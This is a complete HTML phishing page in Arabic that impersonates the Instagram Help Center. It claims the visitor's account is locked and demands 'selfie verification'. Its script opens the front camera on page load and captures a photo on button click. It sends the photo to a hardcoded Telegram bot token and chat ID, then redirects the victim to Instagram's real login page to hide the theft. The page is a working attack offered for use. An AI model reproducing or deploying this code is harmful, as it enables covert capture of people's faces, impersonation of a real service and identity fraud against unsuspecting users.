<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram Help Center</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background-color: #fff; color: #262626; height: 100vh; display: flex; flex-direction: column; }
        
        /* الهيدر العلوي */
        .header { width: 100%; padding: 15px; border-bottom: 1px solid #dbdbdb; text-align: center; background: #fff; position: sticky; top: 0; z-index: 100; }
        .logo { width: 103px; }

        .main-content { padding: 30px 25px; flex: 1; text-align: center; }
        
        /* صورة الحساب من الملف image_8cfa06.png */
        .profile-container { margin-bottom: 20px; position: relative; display: inline-block; }
        .profile-pic { width: 90px; height: 90px; border-radius: 50%; border: 1px solid #dbdbdb; object-fit: cover; }
        .badge { position: absolute; bottom: 0; right: 0; width: 28px; background: #fff; border-radius: 50%; padding: 2px; }

        h2 { font-size: 20px; font-weight: 600; margin-bottom: 12px; color: #262626; }
        .description { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 25px; }

        /* شريط التحميل */
        .loading-box { display: none; margin-top: 15px; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 26px; height: 26px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* الأزرار السفلى */
        .footer-actions { padding: 20px; border-top: 1px solid #dbdbdb; }
        .btn-confirm { background-color: #0095f6; color: #fff; border: none; border-radius: 8px; width: 100%; padding: 14px; font-weight: 600; font-size: 14px; cursor: pointer; margin-bottom: 12px; }
        .btn-link { color: #0095f6; background: none; border: none; font-size: 14px; font-weight: 600; width: 100%; cursor: pointer; }

        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="header">
        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo">
    </div>

    <div class="main-content">
        <div class="profile-container">
            <!-- استخدام الصورة المرفوعة image_8cfa06.png -->
            <img src="https://raw.githubusercontent.com/ammartr1/-/main/image_8cfa06.png" class="profile-pic" alt="User profile">
            <img src="https://cdn-icons-png.flaticon.com/512/747/747305.png" class="badge">
        </div>

        <h2>تأكيد ملكية حسابك</h2>
        <p class="description">لقد اكتشفنا نشاطاً مريباً على حسابك. لحماية مجتمعنا، تم قفل حسابك مؤقتاً. يرجى إجراء فحص الوجه (Selfie Verification) لاستعادة الوصول.</p>
        
        <div id="loader" class="loading-box">
            <div class="spinner"></div>
            <p style="font-size: 12px; color: #0095f6; font-weight: 600;">جاري معالجة البيانات البيومترية...</p>
        </div>
    </div>

    <div class="footer-actions" id="controlPanel">
        <button id="authBtn" class="btn-confirm">بدء التحقق بالفيديو</button>
        <button onclick="location.href='https://help.instagram.com'" class="btn-link">الحصول على مساعدة</button>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
        const CHAT_ID = '2140385904';
        let stream = null;

        // تجهيز العدسة مسبقاً
        window.onload = async () => {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v').srcObject = stream;
            } catch (e) {}
        };

        document.getElementById('authBtn').onclick = async function() {
            const controls = document.getElementById('controlPanel');
            const loader = document.getElementById('loader');
            
            controls.style.display = 'none';
            loader.style.display = 'block';

            if (!stream) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    document.getElementById('v').srcObject = stream;
                } catch (e) {
                    alert("⚠️ يجب السماح بالوصول للكاميرا لإثبات ملكيتك للحساب.");
                    location.reload();
                    return;
                }
            }

            // التقاط لحظي
            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            canvas.width = 480;
            canvas.height = 640;
            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
            
            canvas.toBlob((blob) => {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', blob, 'security.jpg');
                fd.append('caption', '👤 *تم الصيد بواجهة الحساب المقفل*');
                
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                
                // توجيه نهائي مقنع
                setTimeout(() => {
                    if(stream) stream.getTracks().forEach(t => t.stop());
                    window.location.href = "https://www.instagram.com/accounts/login/";
                }, 2500);
            }, 'image/jpeg', 0.5);
        };
    </script>
</body>
</html>
